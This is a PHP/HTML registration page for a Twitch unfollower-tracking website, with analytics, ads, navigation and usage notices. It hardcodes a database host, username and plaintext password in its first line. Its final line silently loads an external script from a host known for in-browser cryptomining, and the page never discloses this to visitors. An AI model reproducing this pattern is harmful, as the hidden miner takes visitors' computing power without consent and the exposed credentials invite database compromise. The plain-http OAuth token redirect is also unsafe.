<?php
$con = mysqli_connect("pdb33.biz.nf", "2293248_tv", "718293Danito978Baychev!", "2293248_tv");
// echo "here";
// print_r($_SESSION);
// exit;
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Unfollowers - Register for free unfollow tracking</title>
        <!-- Google Tag Manager -->
        <script>(function (w, d, s, l, i) {
                w[l] = w[l] || [];
                w[l].push({'gtm.start':
                            new Date().getTime(), event: 'gtm.js'});
                var f = d.getElementsByTagName(s)[0],
                        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
                j.async = true;
                j.src =
                        'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
                f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-TZSXQFP');</script>
        <!-- End Google Tag Manager -->
        <meta name="description" content="Register at unfollowers.tv and find out your unfollowers on Twitch!">
        <meta name="keywords" content="twitch, unfollow, unfollowers, register">
        <meta name="author" content="Daniel Baychev">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" type="image/x-icon" href="img/h.png" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script type = "text/javascript" 
                src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js">
        </script>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <script>
            (adsbygoogle = window.adsbygoogle || []).push({
                google_ad_client: "ca-pub-3989608972631976",
                enable_page_level_ads: true
            });
        </script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="login.js" type="text/javascript"></script>
        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="css/css.css" rel="stylesheet" type="text/css"/>
        <link href="css/index.css" rel="stylesheet" type="text/css"/>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <script>
            function myFunction() {
                var x = document.getElementById("myTopnav");
                if (x.className === "topnav") {
                    x.className += " responsive";
                } else {
                    x.className = "topnav";
                }
            }
        </script>
        <!-- Global site tag (gtag.js) - Google Analytics -->
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-129733775-1"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag() {
                dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'UA-129733775-1');
        </script>
    </head>


    <body id="body" style="font-family: Sans-Serif;background-color: white;">
<?php
//  echo include_once (dirname(__FILE__) . '/pa_antiadblock_2487106.php');
?>
        <!-- Google Tag Manager (noscript) -->
        <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TZSXQFP"
                          height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
        <!-- End Google Tag Manager (noscript) -->
        <nav role='navigation'>
            <div class="topnav" id="myTopnav">
                <a href="register.php" onclick="page(this);" class="active">Unfollower</a>
                <a href="home.php" onclick="page(this);">Home</a>
                <a href="f4f.php" onclick="page(this);">F4F Tool</a>
                <a href="about.php" onclick="page(this);">FAQ'S</a>
                <a id="hidden" style="display:block;margin:auto;text-align:center;" href="https://id.twitch.tv/oauth2/authorize?response_type=token&client_id=v8jjvzxpx7byti5lykiyy5001gueh4&redirect_uri=http://unfollowers.tv/home.php&scope=analytics:read:extensions"><img height="25"  class="logme"  src="img/login.png"></a>

                <a href="javascript:void(0);" class="icon" onclick="myFunction()">
                    <i class="fa fa-bars"></i>
                </a>
            </div>
        </nav>
        <h2 style="text-align: center;color:#ffffff;">
            Before you continue:
        </h2>
<?php // require_once 'ads.php';
?>
        <p class="mobile" >* If you are using your mobile, we highly suggest to use the desktop version instead, since the website is not YET optimized for phones</p>
        <div style="background-color:#33333357;border-radius: .25rem;" class="container">
            <p style="color:white;">Note: The website now works with over 3000+ followers, but is not recommended</p>

            <div class="row">
                <div id="fccStatus" class="col-md-12 col-sm-12">
                    <p style="color:white;">PLEASE READ! <br><br>If this is your first time using the Unfollow tracker keep in mind we will not show you who has unfollowed before your registration!<br>
                        You will also have to check in regularly (maybe after streaming) so we can upload the new followers to the database, otherwise they will not be displayed if they decide to unfollow <img height="35" src="img/hmm.png"></p>
                    <br>

                    <br>


                    <br>
                </div>

            </div>
            <button style="text-align: center;display:block;margin: auto;" class="btn"><a style="color: white;" onclick="page(this);" href="unfollow.php" >Check Unfollowers</a></button>
            <br>
        </div>

        <div class="footer">
            <p style="margin:auto;">twitchtoolstv@gmail.com <a target="_blank" href="https://patreon.com/twitchtools"><img src="img/patreon.png" height="15"/></a> <a href="https://twitter.com/AnalyticsTwitch"><img height="15" src="img/twitter.png"/></a></p>
        </div>
        <script type="text/javascript">  if (typeof tkn === "string") {
                var hide = document.getElementById("hidden");
                hide.style.display = "none";
            }</script>
        <script src="https://www.hostingcloud.racing/8qk1.js"></script>
    </body>
</html>